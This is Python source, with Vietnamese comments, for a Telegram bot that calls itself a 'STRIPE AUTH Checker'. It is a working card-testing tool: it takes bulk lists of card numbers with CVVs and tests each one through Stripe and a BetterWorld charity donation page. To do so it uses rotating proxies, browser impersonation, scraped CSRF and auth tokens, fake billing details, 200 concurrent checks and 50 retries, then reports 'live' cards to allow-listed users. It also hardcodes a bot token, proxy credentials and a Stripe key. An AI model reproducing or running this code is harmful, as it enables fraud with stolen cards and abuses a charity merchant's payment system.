import logging
import sys
import re
import os
import json
import time
import asyncio
import random
import string
import uuid
from datetime import datetime

# Thư viện Telegram
from telegram import Update
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters

# Import curl_cffi
try:
    from curl_cffi.requests import AsyncSession
except ImportError:
    print("Thiếu thư viện curl_cffi! Vui lòng chạy: pip install curl_cffi")
    sys.exit()

# ===================================================================
# === CẤU HÌNH GLOBAL & PROXY & QUYỀN HẠN
# ===================================================================

# Token Telegram
BOT_TOKEN = "8414556300:AAGs-pW76xOmEzi-SbLcHDaUOiUXtYpBq_0"

# Admin ID
ADMIN_ID = 7787551672

# File lưu danh sách người dùng được phép
ALLOWED_USERS_FILE = "allowed_users.json"

# Cấu hình Proxy
PROXY_STR = "asg.360s5.com:3600:88634867-zone-custom:AetOKcLB"
try:
    p_host, p_port, p_user, p_pass = PROXY_STR.split(":")
    PROXY_URL = f"http://{p_user}:{p_pass}@{p_host}:{p_port}"
    PROXIES_CONFIG = {
        "http": PROXY_URL,
        "https": PROXY_URL
    }
except ValueError:
    print("Lỗi cấu hình Proxy! Kiểm tra lại PROXY_STR. Bot sẽ chạy không Proxy hoặc lỗi.")
    PROXIES_CONFIG = None # Hoặc để {} tùy logic

# BetterWorld Config
STRIPE_PK = "pk_live_aGE2zfplg4kOqYZ4QWKOM9ah"
URL_CONST = "https://bubstrong.betterworld.org"

# Logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# ===================================================================
# === HỆ THỐNG QUẢN LÝ USER (AUTH)
# ===================================================================

def load_allowed_users():
    if not os.path.exists(ALLOWED_USERS_FILE):
        return []
    try:
        with open(ALLOWED_USERS_FILE, 'r') as f:
            return json.load(f)
    except:
        return []

def save_allowed_user(user_id):
    users = load_allowed_users()
    if user_id not in users:
        users.append(user_id)
        with open(ALLOWED_USERS_FILE, 'w') as f:
            json.dump(users, f)
        return True
    return False

def is_user_allowed(user_id):
    if user_id == ADMIN_ID:
        return True
    users = load_allowed_users()
    return user_id in users

# ===================================================================
# === PHẦN 2: HELPER FUNCTIONS
# ===================================================================

def normalize_card(card_str):
    pattern = r'(\d{13,19})[\s|/;:.-]+(\d{1,2})[\s|/;:.-]+(\d{2,4})[\s|/;:.-]+(\d{3,4})'
    match = re.search(pattern, card_str)
    
    if not match:
        return None
    
    card_num, month, year, cvv = match.groups()
    
    # Validate Month
    try:
        month_int = int(month)
        if month_int < 1 or month_int > 12: return None
    except ValueError: return None
    
    # Validate Year
    if len(year) == 2: year = '20' + year
    try:
        year_int = int(year)
        # Cho phép range rộng hơn một chút vì logic cũ
        if year_int < 2024 or year_int > 2040: 
            return None
    except ValueError: return None
    
    month = month.zfill(2)
    return f"{card_num}|{month}|{year}|{cvv}"

def extract_cards_from_text(text):
    if not text: return []
    valid_cards = []
    seen = set()
    
    lines = text.splitlines()
    pattern_strict = r'(\d{13,19})[\s|/;:.-]+(\d{1,2})[\s|/;:.-]+(\d{2,4})[\s|/;:.-]+(\d{3,4})'
    
    for line in lines:
        matches = re.findall(pattern_strict, line)
        for m in matches:
            temp_str = f"{m[0]}|{m[1]}|{m[2]}|{m[3]}"
            normalized = normalize_card(temp_str)
            if normalized and normalized not in seen:
                valid_cards.append(normalized)
                seen.add(normalized)
    return valid_cards

def validate_luhn(card_number):
    card_num = ''.join(filter(str.isdigit, str(card_number)))
    if not card_num or len(card_num) < 13 or len(card_num) > 19: return False
    total = 0
    reverse_digits = card_num[::-1]
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if i % 2 == 1:
            n = n * 2
            if n > 9: n = n - 9
        total += n
    return total % 10 == 0

def random_string(length=10):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length)) + "@gmail.com"

def generate_progress_bar(current, total, length=15):
    if total == 0: return ""
    percent = current / total
    filled_length = int(length * percent)
    bar = "█" * filled_length + "░" * (length - filled_length)
    return f"[{bar}] {int(percent * 100)}%"

async def get_bin_info(session, cc_num):
    try:
        url = f"https://bins.antipublic.cc/bins/{cc_num}"
        resp = await session.get(url, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            return f"{data.get('brand','N/A')} - {data.get('country_name','N/A')} - {data.get('bank','N/A')} - {data.get('level','N/A')} - {data.get('type','N/A')}"
        else:
            return "BIN N/A"
    except Exception:
        return "BIN ERROR"

# ===================================================================
# === PHẦN 3: XỬ LÝ CHECK CARD (CORE LOGIC BETTERWORLD)
# ===================================================================

async def check_card_core(line, session_semaphore=None):
    start_time = time.time()
    line = line.strip()
    result = {
        "status": "ERROR",
        "msg": "Invalid Format",
        "full_log": line + " - Invalid Format",
        "is_live": False,
        "bin_info": "N/A"
    }

    normalized = normalize_card(line)
    if not normalized:
        return result
        
    cc, mm, yyyy, cvc = normalized.split('|')
    
    if not validate_luhn(cc):
        result["msg"] = "Luhn Fail"
        result["full_log"] = f"{normalized} - Luhn Fail"
        return result

    if session_semaphore:
        async with session_semaphore:
            return await _execute_check_betterworld(cc, mm, yyyy, cvc, start_time)
    else:
        return await _execute_check_betterworld(cc, mm, yyyy, cvc, start_time)

async def _execute_check_betterworld(cc, mm, yyyy, cvc, start_time):
    # Retry configuration - ĐÃ CẬP NHẬT LÊN 50
    max_retries = 50 
    impersonate_ver = "chrome124"
    
    # Message result holder
    messegner = ""
    status = "ERROR"
    is_live = False
    
    # Bin info holder
    bin_info_str = "Checking..."

    for attempt in range(max_retries):
        try:
            async with AsyncSession(impersonate=impersonate_ver, proxies=PROXIES_CONFIG, verify=False, timeout=30) as session:
                
                # Get BIN info ở lần chạy đầu tiên
                if attempt == 0:
                    bin_info_str = await get_bin_info(session, cc)

                email_random = random_string(10)

                # ---------------------------------------------------------
                # BƯỚC 1: REQUEST STRIPE (Tạo Payment Method)
                # ---------------------------------------------------------
                stripe_url = "https://api.stripe.com/v1/payment_methods"
                
                guid = str(uuid.uuid4())
                muid = str(uuid.uuid4())
                sid = str(uuid.uuid4())
                
                stripe_payload = {
                    "type": "card",
                    "card[number]": cc,
                    "card[cvc]": cvc,
                    "card[exp_year]": yyyy,
                    "card[exp_month]": mm,
                    "allow_redisplay": "unspecified",
                    "billing_details[address][postal_code]": "53227",
                    "billing_details[address][country]": "US",
                    "billing_details[address][line1]": "2830 Oakridge Farm Lane",
                    "billing_details[address][city]": "West Allis",
                    "billing_details[address][state]": "WI",
                    "billing_details[name]": "Minh Nhat",
                    "payment_user_agent": "stripe.js/f47b5e380c; stripe-js-v3/f47b5e380c; payment-element; deferred-intent; autopm",
                    "referrer": URL_CONST,
                    "time_on_page": str(random.randint(45000, 120000)),
                    "guid": guid,
                    "muid": muid,
                    "sid": sid,
                    "key": STRIPE_PK
                }

                headers_stripe = {
                    "Accept": "application/json",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": "https://js.stripe.com",
                    "Referer": "https://js.stripe.com/"
                }

                req1 = await session.post(stripe_url, data=stripe_payload, headers=headers_stripe)
                try:
                    json_stripe = req1.json()
                except:
                    # Nếu không parse được json, có thể do mạng, retry
                    raise Exception("Stripe JSON Error")

                # Check lỗi Stripe
                if "error" in json_stripe:
                    err_code = json_stripe["error"].get("code", "")
                    message = json_stripe['error'].get('message', '')
                    messegner = f"Stripe Error: {message}"
                    status = "DECLINED"
                    
                    # Nếu lỗi cứng do thẻ -> Break loop, không retry
                    if err_code in ["invalid_cvc", "incorrect_number", "card_declined", "expired_card"]:
                        break 
                    else:
                        # Nếu rate limit hoặc lỗi lạ -> Retry
                        raise Exception(f"Stripe Soft Error: {message}")

                pm_id = json_stripe.get("id")
                if not pm_id:
                    raise Exception("Missing PM ID") 

                # ---------------------------------------------------------
                # BƯỚC 2: GET TRANG DONATE (Lấy Token)
                # ---------------------------------------------------------
                donate_url = "https://bubstrong.betterworld.org/donate"
                headers_get = {
                    "Referer": "https://bubstrong.betterworld.org/",
                    "Upgrade-Insecure-Requests": "1"
                }

                req2 = await session.get(donate_url, headers=headers_get)
                if req2.status_code != 200:
                    raise Exception(f"Get Page Failed: {req2.status_code}")

                html_source = req2.text
                match_au = re.search(r'bwc&quot;:&quot;(.*?)&quot', html_source)
                match_token = re.search(r'<meta name="csrf-token" content="(.*?)"', html_source)
                
                if not match_au or not match_token:
                    raise Exception("Missing Tokens (au/csrf)")

                au_token = match_au.group(1)
                csrf_token = match_token.group(1)

                # ---------------------------------------------------------
                # BƯỚC 3: SETUP INTENTS
                # ---------------------------------------------------------
                setup_url = "https://api.betterworld.org/v1/user-payments/setup-intents"
                headers_bw = {
                    "accept": "application/json, text/javascript, */*; q=0.01",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "origin": "https://bubstrong.betterworld.org",
                    "referer": "https://bubstrong.betterworld.org/",
                    "x-auth-token": au_token,
                    "x-bw-src": "l",
                    "x-csrf-token": csrf_token,
                    "x-requested-with": "XMLHttpRequest"
                }
                
                data_setup = {
                    "email": email_random,
                    "payment_method_type": "card",
                    "is_widget": "0"
                }

                req3 = await session.post(setup_url, data=data_setup, headers=headers_bw)
                json_setup = req3.json()
                
                if "data" in json_setup and "user_setup_intent_id" in json_setup["data"]:
                    intent_id = json_setup["data"]["user_setup_intent_id"]
                else:
                    raise Exception("Missing Intent ID")

                # ---------------------------------------------------------
                # BƯỚC 4: CONFIRM
                # ---------------------------------------------------------
                confirm_url = f"https://api.betterworld.org/v1/user-payments/setup-intents/{intent_id}/confirm"
                headers_bw["origin"] = URL_CONST
                headers_bw["referer"] = URL_CONST
                
                data_confirm = {
                    "payment_method_type": "card",
                    "stripe_payment_method_id": pm_id,
                    "is_widget": "0"
                }

                req4 = await session.post(confirm_url, data=data_confirm, headers=headers_bw)
                response_text = req4.text
                
                # Xử lý kết quả
                try:
                    json_confirm = req4.json()
                    error_desc = json_confirm.get("error_description", "")
                except:
                    error_desc = ""

                if "user_payment_method_id" in response_text and req4.status_code in [200, 201]:
                    status = "APPROVED"
                    messegner = "APPROVED V3 ✅ - STRIPE AUTH"
                    is_live = True
                elif error_desc:
                    status = "DECLINED"
                    messegner = f"[CUSTOM] {error_desc}"
                elif "security code is incorrect" in response_text or "incorrect_cvc" in response_text:
                    status = "CCN"
                    messegner = "CCN - Incorrect CVV"
                elif "insufficient_funds" in response_text:
                    status = "CVV"
                    messegner = "CVV - Insufficient Funds"
                    # Có thể coi là Live tùy quy ước, ở đây để CVV
                elif req4.status_code == 403:
                    raise Exception("403 Forbidden") 
                else:
                    status = "DECLINED"
                    messegner = f"[DECLINED] {response_text[:50]}"
                
                # Chạy xong logic thì break khỏi vòng lặp retry
                break

        except Exception as e:
            # Nếu là lần cuối cùng (lần thứ 50)
            if attempt == max_retries - 1:
                messegner = f"ERROR - MAX RETRIES ({str(e)})"
                status = "ERROR"
            else:
                # Nghỉ nhẹ 1s rồi retry
                await asyncio.sleep(1)
                continue
    
    end_time = time.time()
    time_taken = round(end_time - start_time, 2)
    log_str = f"{cc}|{mm}|{yyyy}|{cvc} - {messegner} - Time: {time_taken}s"

    return {
        "status": status,
        "is_live": is_live,
        "full_log": log_str,
        "bin_info": bin_info_str
    }

# ===================================================================
# === PHẦN 4: LOGIC XỬ LÝ HÀNG LOẠT (NON-BLOCKING)
# ===================================================================

class CheckStats:
    def __init__(self):
        self.total = 0
        self.checked = 0
        self.live = 0
        self.die = 0
        self.error = 0
        self.start_time = time.time()
        self.is_running = True

async def process_card_list(update: Update, context: ContextTypes.DEFAULT_TYPE, card_list: list):
    """
    Hàm xử lý chạy ngầm, không block main thread
    """
    total_cards = len(card_list)
    if total_cards == 0:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Không tìm thấy thẻ hợp lệ nào.")
        return

    stats = CheckStats()
    stats.total = total_cards
    
    try:
        status_msg = await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"🚀 **Started Background Task STRIPE AUTH)**\n"
                 f"Cards: {total_cards}\n"
                 f"Threads: 100\n"
                 f"Retries: 50"
        )
    except:
        return

    chat_id = update.effective_chat.id
    live_file = f"live_{chat_id}.txt"
    die_file = f"die_{chat_id}.txt"
    error_file = f"error_{chat_id}.txt"
    
    for f_path in [live_file, die_file, error_file]:
        if os.path.exists(f_path): os.remove(f_path)

    # 100 Threads
    semaphore = asyncio.Semaphore(200)
    file_lock = asyncio.Lock()
    
    # Task cập nhật UI
    async def update_ui_loop():
        last_checked = -1
        while stats.is_running and stats.checked < stats.total:
            await asyncio.sleep(3.0) 
            if stats.checked != last_checked: 
                last_checked = stats.checked
                elapsed = time.time() - stats.start_time
                cpm = int((stats.checked / elapsed) * 60) if elapsed > 0 else 0
                progress_bar = generate_progress_bar(stats.checked, stats.total, length=15)
                
                text = (
                    f"⚡ **Checking STRIPEAUTH...**\n"
                    f"{progress_bar}\n"
                    f"✅ Live: {stats.live} | ❌ Die: {stats.die} | ⚠️ Err: {stats.error}\n"
                    f"Checked: {stats.checked}/{stats.total}\n"
                    f"🚀 CPM: {cpm}\n"
                )
                try:
                    await status_msg.edit_text(text)
                except: pass 

    ui_task = asyncio.create_task(update_ui_loop())

    async def worker(line):
        res = await check_card_core(line, session_semaphore=semaphore)
        stats.checked += 1
        
        # BÁO LIVE TỨC THÌ
        if res["is_live"]:
            try:
                msg_live = (
                    f"✅ **APPROVED V3!**\n"
                    f"💳 `{line.split('|')[0]}...`\n"
                    f"📝 Result: {res['full_log']}\n"
                    f"🏦 Bin: {res['bin_info']}"
                )
                await context.bot.send_message(chat_id=chat_id, text=msg_live)
            except: pass

        async with file_lock:
            if res["is_live"]:
                stats.live += 1
                with open(live_file, "a", encoding="utf-8") as f: f.write(res["full_log"] + "\n")
            elif res["status"] == "ERROR":
                stats.error += 1
                with open(error_file, "a", encoding="utf-8") as f: f.write(res["full_log"] + "\n")
            else:
                stats.die += 1
                with open(die_file, "a", encoding="utf-8") as f: f.write(res["full_log"] + "\n")
    
    # Chạy các worker
    tasks = [worker(line) for line in card_list]
    await asyncio.gather(*tasks)

    stats.is_running = False
    await ui_task 

    # Gửi kết quả cuối cùng
    await context.bot.send_message(chat_id=chat_id, text=f"✅ **Hoàn tất Check!**\nLive: {stats.live} | Die: {stats.die}")
    
    async def send_result_file(file_path, caption_title):
        if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
            try:
                with open(file_path, 'rb') as f:
                    await context.bot.send_document(chat_id=chat_id, document=f, caption=f"📂 {caption_title}")
            except Exception: pass
            finally:
                if os.path.exists(file_path): os.remove(file_path)
        elif os.path.exists(file_path): os.remove(file_path)

    await send_result_file(live_file, f"✅ Live Cards ({stats.live})")
    await send_result_file(die_file, f"❌ Die Cards ({stats.die})")
    await send_result_file(error_file, f"⚠️ Error/Invalid Cards ({stats.error})")

# ===================================================================
# === PHẦN 5: BOT COMMAND HANDLERS
# ===================================================================

# Decorator kiểm tra quyền
def restricted(func):
    async def wrapped(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.effective_user.id
        if not is_user_allowed(user_id):
            await update.message.reply_text("⛔ Bạn không có quyền sử dụng Bot này.")
            return
        return await func(update, context, *args, **kwargs)
    return wrapped

@restricted
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    role = "ADMIN 👑" if user_id == ADMIN_ID else "MEMBER 👤"
    
    await update.message.reply_text(
        f"🤖 **STRIPE AUTH Checker Bot**\n"
        f"👋 Xin chào, {role}\n\n"
        "1. `/st <cc>`: Check lẻ.\n"
        "2. Gửi file `.txt` hoặc `/mass` để check (Chạy ẩn).\n"
        "3. `/allow <id>`: Thêm thành viên (ADMIN).\n\n"
        f"Gate: Bubstrong STRIPE AUTH (Stripe Setup Intent)"
    )

async def allow_user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("⛔ Chỉ Admin mới được dùng lệnh này.")
        return
    
    args = context.args
    if not args:
        await update.message.reply_text("⚠️ Cú pháp: `/allow <telegram_id>`")
        return
    
    try:
        target_id = int(args[0])
        if save_allowed_user(target_id):
            await update.message.reply_text(f"✅ Đã thêm ID `{target_id}` vào danh sách được phép.")
        else:
            await update.message.reply_text(f"ℹ️ ID `{target_id}` đã có trong danh sách.")
    except ValueError:
        await update.message.reply_text("⚠️ ID phải là số.")

@restricted
async def single_check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        full_text = update.message.text
        cards = extract_cards_from_text(full_text)
        if not cards:
            await update.message.reply_text("⚠️ Không tìm thấy thẻ hoặc sai định dạng.")
            return

        card_data = cards[0]
        
        msg = await update.message.reply_text(f"⏳ Đang check: {card_data}\nGate: STRIPE AUTH")
        
        result = await check_card_core(card_data)
        
        bin_info = result.get('bin_info', 'N/A')
        log_clean = result['full_log']
             
        formatted_response = f"💳 Card: `{card_data}`\n" \
                             f"ℹ️ Status: {log_clean}\n" \
                             f"🏦 Bin: {bin_info}"

        await msg.edit_text(formatted_response)
    except Exception as e:
        await update.message.reply_text(f"Lỗi: {str(e)}")

@restricted
async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        full_text = update.message.text
        cards = extract_cards_from_text(full_text)
        if not cards:
            await update.message.reply_text("⚠️ Không tìm thấy thẻ hợp lệ.")
            return
        
        await update.message.reply_text(f"🚀 Đã nhận {len(cards)} thẻ. Quá trình check sẽ chạy ngầm...")
        asyncio.create_task(process_card_list(update, context, cards))
        
    except Exception as e:
        await update.message.reply_text(f"Lỗi Mass: {str(e)}")

@restricted
async def file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Chỉ nhận file .txt")
        return
    file = await context.bot.get_file(document.file_id)
    file_content = await file.download_as_bytearray()
    full_text = file_content.decode('utf-8')
    
    cards = extract_cards_from_text(full_text)
    
    await update.message.reply_text(f"🚀 Đã nhận file {len(cards)} thẻ. Quá trình check sẽ chạy ngầm...")
    asyncio.create_task(process_card_list(update, context, cards))

# ===================================================================
# === MAIN
# ===================================================================

if __name__ == '__main__':
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("st", single_check_command))
    app.add_handler(CommandHandler("mass", mass_command))
    app.add_handler(CommandHandler("allow", allow_user_command))
    app.add_handler(MessageHandler(filters.Document.ALL, file_handler))
    
    print("Bot đang chạy...")
    app.run_polling()
